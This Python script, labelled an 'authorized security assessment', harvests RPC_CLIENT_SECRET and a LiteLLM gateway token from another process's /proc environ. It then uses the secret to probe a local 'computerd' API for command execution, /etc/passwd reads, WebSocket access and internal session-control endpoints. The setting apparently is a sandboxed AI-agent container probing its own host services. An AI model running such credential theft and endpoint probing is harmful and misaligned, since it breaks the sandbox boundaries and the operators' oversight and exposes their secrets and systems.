#!/usr/bin/env python3
"""Use recovered RPC_CLIENT_SECRET to enumerate computerd's authenticated API.
Authorized Security Assessment.
"""
import subprocess, os, re, json, time, socket

LOG = "/mnt/data/output/computerd_auth_api.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except:
        return "", "", -1

# ── STEP 1: Recover RPC_CLIENT_SECRET from /proc/89/environ ──
log("=" * 70)
log("  COMPUTERD AUTHENTICATED API ENUMERATION")
log("  Authorized Security Assessment")
log("=" * 70)

rpc_secret = None
gateway_token = None

# Find process-api PID dynamically
out, _, _ = run("ps aux 2>/dev/null")
pa_pid = None
for line in (out or "").split("\n"):
    if "process-api" in line and "python" in line and "grep" not in line:
        parts = line.split()
        if len(parts) > 1:
            pa_pid = parts[1]
            break

if not pa_pid:
    # fallback: try known PID 89
    pa_pid = "89"

log(f"\n── 1. TOKEN RECOVERY (PID {pa_pid}) ──")
try:
    with open(f"/proc/{pa_pid}/environ", "rb") as f:
        raw = f.read()
    env_str = raw.decode("utf-8", errors="replace")
    for var in env_str.split("\0"):
        if var.startswith("RPC_CLIENT_SECRET="):
            rpc_secret = var.split("=", 1)[1]
            log(f"  RPC_CLIENT_SECRET: RECOVERED (len={len(rpc_secret)})")
        elif var.startswith("LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN="):
            gateway_token = var.split("=", 1)[1]
            log(f"  GATEWAY_TOKEN: RECOVERED (len={len(gateway_token)})")
except Exception as e:
    log(f"  Failed to read /proc/{pa_pid}/environ: {e}")

if not rpc_secret:
    log("  FATAL: Could not recover RPC_CLIENT_SECRET. Aborting.")
    with open(LOG, "w") as f:
        f.write("\n".join(lines) + "\n")
    exit(1)

# ── STEP 2: Authenticated endpoint enumeration ──
log(f"\n── 2. AUTHENTICATED ENDPOINT SCAN ──")
log(f"  Using Bearer token: {rpc_secret[:4]}...{rpc_secret[-4:]}")

import urllib.request, urllib.error

COMPUTERD = "http://127.0.0.1:8080"

def req(method, path, body=None, content_type=None, extra_headers=None):
    url = f"{COMPUTERD}{path}"
    data = body.encode() if body else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Authorization", f"Bearer {rpc_secret}")
    if content_type:
        r.add_header("Content-Type", content_type)
    if extra_headers:
        for k, v in extra_headers.items():
            r.add_header(k, v)
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        body_out = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body_out
    except urllib.error.HTTPError as e:
        body_out = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body_out
    except Exception as e:
        return -1, {}, str(e)

# 2a. Basic endpoints
log("\n  ── 2a. Core endpoints (authenticated) ──")
for method, path in [
    ("GET", "/"),
    ("GET", "/health"),
    ("GET", "/api"),
    ("POST", "/api"),
    ("GET", "/connect"),
    ("POST", "/connect"),
    ("GET", "/version"),
    ("GET", "/status"),
    ("GET", "/info"),
    ("GET", "/metrics"),
    ("GET", "/debug"),
    ("GET", "/stats"),
]:
    code, headers, body = req(method, path)
    preview = body[:200].replace("\n", " ") if body else "(empty)"
    log(f"    {method:6} {path:30} → {code}  {preview}")

# 2b. API sub-paths
log("\n  ── 2b. /api sub-paths ──")
for path in [
    "/api/v1", "/api/v1/files", "/api/v1/exec", "/api/v1/read",
    "/api/v1/write", "/api/v1/list", "/api/v1/stat", "/api/v1/mkdir",
    "/api/v1/rm", "/api/v1/mv", "/api/v1/cp", "/api/v1/upload",
    "/api/v1/download", "/api/v1/shell", "/api/v1/process",
    "/api/v1/env", "/api/v1/config", "/api/v1/status",
    "/api/files", "/api/exec", "/api/read", "/api/write",
    "/api/list", "/api/upload", "/api/download", "/api/shell",
    "/api/env", "/api/config", "/api/status", "/api/stat",
]:
    code, headers, body = req("GET", path)
    if code != 404:
        preview = body[:200].replace("\n", " ") if body else "(empty)"
        log(f"    GET    {path:35} → {code}  {preview}")

# 2c. FUSE/file operations via POST
log("\n  ── 2c. File operation probes ──")
file_ops = [
    ("/api", {"op": "list", "path": "/"}),
    ("/api", {"op": "read", "path": "/mnt/data"}),
    ("/api", {"op": "stat", "path": "/"}),
    ("/api", {"op": "exec", "cmd": "id"}),
    ("/api", {"op": "env"}),
    ("/api", {"action": "list", "path": "/"}),
    ("/api", {"action": "read", "path": "/mnt/data"}),
    ("/api", {"command": "ls", "args": ["-la", "/"]}),
    ("/api/v1/exec", {"command": "id"}),
    ("/api/v1/read", {"path": "/etc/passwd"}),
    ("/api/v1/list", {"path": "/"}),
]
for path, payload in file_ops:
    body_str = json.dumps(payload)
    code, headers, body = req("POST", path, body=body_str, content_type="application/json")
    if code != 404:
        preview = body[:300].replace("\n", " ") if body else "(empty)"
        log(f"    POST   {path:25} {json.dumps(payload)[:40]:40} → {code}  {preview}")

# 2d. Connect endpoint (authenticated) — try to re-connect or inspect
log("\n  ── 2d. /connect probes (authenticated) ──")
connect_payloads = [
    # v3 format
    {"base": "http://127.0.0.1:9999", "health": "/health", "api": "/v1"},
    # v2 format
    {"url": "http://127.0.0.1:9999/v1/ws"},
    # empty
    {},
    # status query
    {"status": True},
    {"action": "status"},
]
for payload in connect_payloads:
    body_str = json.dumps(payload)
    code, headers, body = req("POST", "/connect", body=body_str, content_type="application/json")
    preview = body[:300].replace("\n", " ") if body else "(empty)"
    log(f"    POST   /connect  {json.dumps(payload)[:50]:50} → {code}  {preview}")

# 2e. WebSocket upgrade with auth
log("\n  ── 2e. WebSocket upgrade (authenticated) ──")
for path in ["/api", "/ws", "/connect", "/", "/api/v1/ws"]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", 8080))
        ws_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1:8080\r\n"
            f"Authorization: Bearer {rpc_secret}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        )
        s.sendall(ws_req.encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        first_line = resp.split("\r\n")[0] if resp else "(no response)"
        log(f"    WS {path:20} → {first_line}")
        if "101" in first_line:
            log(f"      UPGRADE ACCEPTED! Full response:\n{resp[:500]}")
        s.close()
    except Exception as e:
        log(f"    WS {path:20} → error: {e}")

# 2f. Hidden/internal endpoints
log("\n  ── 2f. Internal endpoints ──")
for path in [
    "/__computerd/stats", "/__computerd/debug", "/__computerd/config",
    "/__computerd/env", "/__computerd/secret", "/__computerd/version",
    "/__computerd/connections", "/__computerd/sessions", "/__computerd/fuse",
    "/__workspace/live_turn", "/__hibernate", "/__stop_session",
    "/__drain", "/__workspace",
]:
    for method in ["GET", "POST"]:
        code, headers, body = req(method, path)
        if code != 404:
            preview = body[:200].replace("\n", " ") if body else "(empty)"
            log(f"    {method:6} {path:35} → {code}  {preview}")

# ── STEP 3: Gateway token test ──
log(f"\n── 3. LITELLM GATEWAY TOKEN TEST ──")
if gateway_token:
    log(f"  Token: {gateway_token[:4]}...{gateway_token[-4:]} (len={len(gateway_token)})")
    # Try to find the gateway URL
    for var in env_str.split("\0"):
        if "LITELLM" in var or "LLM_WORKER" in var or "GATEWAY" in var:
            k = var.split("=", 1)[0] if "=" in var else var
            if k not in ("LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN",):
                log(f"  Related env: {var[:100]}")
else:
    log("  Gateway token not recovered")

# ── STEP 4: Full env dump of PID 89 (key names only) ──
log(f"\n── 4. FULL ENV KEY INVENTORY (PID {pa_pid}) ──")
try:
    for var in sorted(env_str.split("\0")):
        if "=" in var:
            k = var.split("=", 1)[0]
            v = var.split("=", 1)[1]
            log(f"    {k} = (len={len(v)})")
except:
    pass

log("\n" + "=" * 70)
with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")
log(f"\nSaved: {LOG}")
